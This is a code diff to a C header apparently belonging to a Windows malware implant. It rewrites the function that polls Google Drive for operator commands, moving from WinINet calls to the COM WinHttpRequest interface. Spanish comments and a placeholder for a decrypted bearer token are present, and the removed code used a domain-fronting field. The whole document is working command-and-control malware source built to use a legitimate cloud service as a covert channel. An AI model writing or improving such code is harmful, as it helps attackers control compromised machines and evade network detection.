@@ -2,7 +2,8 @@
 #define GDRIVE_C2_H
 
 #include <windows.h>
-#include <wininet.h>
+#include <objbase.h>
+#include <httprequest.h>
 #include <stdint.h>
 #include "crypto.h"
 
@@ -43,35 +44,55 @@ static void DeriveHostKey(uint8_t *key) {
 // =============================================================================
 
 static BOOL GDrive_CheckForCommands(char *buffer, DWORD bufferSize) {
-    uint8_t key[32];
-    DeriveHostKey(key);
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr) && hr != S_FALSE) return FALSE;
+
+    IWinHttpRequest *pRequest = NULL;
+    hr = CoCreateInstance(CLSID_WinHttpRequest, NULL, CLSCTX_INPROC_SERVER, IID_IWinHttpRequest, (void**)&pRequest);
     
-    // En una implementación real, aquí descifraríamos g_C2.encryptedToken
-    // usando ChaCha20 con la clave derivada.
-    LPCWSTR decryptedToken = L"Bearer [REAL_TOKEN_DESCIFRADO]"; 
+    BOOL success = FALSE;
+    if (SUCCEEDED(hr)) {
+        BSTR bstrMethod = SysAllocString(L"GET");
+        BSTR bstrUrl = SysAllocString(L"https://www.googleapis.com/drive/v3/files?pageSize=1");
+        VARIANT varAsync; VariantInit(&varAsync);
+        varAsync.vt = VT_BOOL;
+        varAsync.boolVal = VARIANT_FALSE;
 
-    HINTERNET hSession = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    if (!hSession) return FALSE;
+        hr = pRequest->Open(bstrMethod, bstrUrl, varAsync);
+        if (SUCCEEDED(hr)) {
+            LPCWSTR decryptedToken = L"Bearer [REAL_TOKEN_DESCIFRADO]";
+            pRequest->SetRequestHeader(L"Authorization", decryptedToken);
 
-    HINTERNET hConnect = InternetConnectW(hSession, g_C2.domainFront, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    if (!hConnect) {
-        InternetCloseHandle(hSession);
-        return FALSE;
-    }
-
-    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", L"/drive/v3/files?pageSize=1", NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
-    if (hRequest) {
-        HttpAddRequestHeadersW(hRequest, decryptedToken, (DWORD)-1, HTTP_ADDREQ_FLAG_ADD);
-        if (HttpSendRequestW(hRequest, NULL, 0, NULL, 0)) {
-            InternetReadFile(hRequest, buffer, bufferSize - 1, &bufferSize);
-            buffer[bufferSize] = '\0';
+            VARIANT varEmpty; VariantInit(&varEmpty);
+            hr = pRequest->Send(varEmpty);
+            if (SUCCEEDED(hr)) {
+                VARIANT varBody; VariantInit(&varBody);
+                hr = pRequest->get_ResponseBody(&varBody);
+                if (SUCCEEDED(hr) && (varBody.vt & VT_ARRAY)) {
+                    long lBound, uBound;
+                    SafeArrayGetLBound(varBody.parray, 1, &lBound);
+                    SafeArrayGetUBound(varBody.parray, 1, &uBound);
+                    long len = uBound - lBound + 1;
+                    
+                    void *pData;
+                    SafeArrayAccessData(varBody.parray, &pData);
+                    DWORD toCopy = (len < (long)bufferSize - 1) ? len : (bufferSize - 1);
+                    memcpy(buffer, pData, toCopy);
+                    buffer[toCopy] = '\0';
+                    SafeArrayUnaccessData(varBody.parray);
+                    
+                    VariantClear(&varBody);
+                    success = TRUE;
+                }
+            }
         }
-        InternetCloseHandle(hRequest);
+        SysFreeString(bstrMethod);
+        SysFreeString(bstrUrl);
+        pRequest->Release();
     }
 
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hSession);
-    return TRUE;
+    CoUninitialize();
+    return success;
 }
 
 #endif
